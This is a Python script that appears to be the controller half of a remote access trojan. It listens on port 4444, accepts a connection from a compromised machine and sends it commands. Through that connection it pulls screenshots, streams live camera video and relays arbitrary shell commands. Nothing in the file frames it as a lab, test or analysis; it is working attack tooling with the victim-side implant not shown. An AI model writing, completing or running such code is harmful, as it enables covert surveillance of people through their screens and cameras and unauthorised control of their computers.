import socket
import cv2
import numpy as np
from PIL import Image
from io import BytesIO

host = "192.168.1.x"
port = 4444

def server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"Server ready on {host}:{port}")
    
    conn, addr = server.accept()
    print(f"Connected to {addr}")
    
    try:
        while True:
            command = input("Send command: ")
            conn.sendall(command.encode())
            
            
            if command.lower() == "screenshot":
                size_data = conn.recv(4)
                if not size_data:
                    break
                    
                image_size = int.from_bytes(size_data, 'big')
                print(f"Receiving image ({image_size} bytes)")
                
                screen_data = b""
                while len(screen_data) < image_size:
                    remaining = image_size - len(screen_data)
                    packet = conn.recv(min(4096, remaining))
                    if not packet:
                        break
                    screen_data += packet
                
                with open("screen.png", "wb") as file:
                    file.write(screen_data)
                print("Screenshot saved!")
                
            elif command.lower() == "live":
                print("Receiving live video... Press 'q' to stop")
                
                while True:
            
                    size_data = conn.recv(4)
                    if not size_data:
                        break
                    
                    frame_size = int.from_bytes(size_data, 'big')
                    
                
                    frame_data = b""
                    while len(frame_data) < frame_size:
                        remaining = frame_size - len(frame_data)
                        packet = conn.recv(min(4096, remaining))
                        if not packet:
                            break
                        frame_data += packet
                  
                    img = Image.open(BytesIO(frame_data))
                    frame = np.array(img)
                    frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                    
                    cv2.imshow("Live Camera", frame_bgr)
                    
            
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        conn.sendall(b"stop")
                        break
                
                cv2.destroyAllWindows()
                print("Live video stopped")
            
            elif command.lower() == "cmd":
                while True:
                    cmd = input("promt? ")
                    conn.sendall(cmd.encode())
                    if cmd.lower() == "exitcmd":
                        break

            elif command.lower() == "exit":
                print("Closing connection...")
                break
                
    finally:
        conn.close()
        server.close()

if __name__ == "__main__":
    server()
